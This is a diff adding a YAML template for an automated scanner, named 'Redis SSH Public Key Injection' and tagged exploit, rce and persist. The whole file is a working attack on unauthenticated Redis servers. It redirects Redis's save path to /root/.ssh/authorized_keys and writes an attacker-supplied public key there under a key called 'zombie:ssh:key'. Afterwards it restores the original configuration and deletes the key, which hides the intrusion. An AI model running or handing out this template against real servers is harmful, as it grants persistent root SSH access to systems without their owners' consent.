@@ -1,0 +1,51 @@
+id: redis-write-ssh-key-param
+service: [redis]
+variables:
+  ssh_dir: /root/.ssh
+  ssh_key: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...
+info:
+  name: Redis SSH Public Key Injection
+  severity: critical
+  tags: redis,exploit,rce,ssh,persist
+
+services:
+  - ops:
+      - kv: "CONFIG GET dir"
+        name: dir
+      - kv: "CONFIG GET dbfilename"
+        name: dbfilename
+    extractors:
+      - type: regex
+        name: orig_dir
+        internal: true
+        part: dir
+        regex: ['(?m)^dir\s+(.+)$']
+        group: 1
+      - type: regex
+        name: orig_file
+        internal: true
+        part: dbfilename
+        regex: ['(?m)^dbfilename\s+(.+)$']
+        group: 1
+
+  - ops:
+      - kv: "CONFIG SET dir {{ssh_dir}}"
+      - kv: "CONFIG SET dbfilename authorized_keys"
+      - kv: "SET zombie:ssh:key \"\\n\\n{{ssh_key}}\\n\\n\""
+      - kv: "SAVE"
+        name: save_result
+    matchers:
+      - type: word
+        part: save_result
+        words: ["OK"]
+    extractors:
+      - type: regex
+        name: redis_ssh_key_written
+        part: save_result
+        regex: ['(OK)']
+        group: 1
+
+  - ops:
+      - kv: "CONFIG SET dir {{orig_dir}}"
+      - kv: "CONFIG SET dbfilename {{orig_file}}"
+      - kv: "DEL zombie:ssh:key"
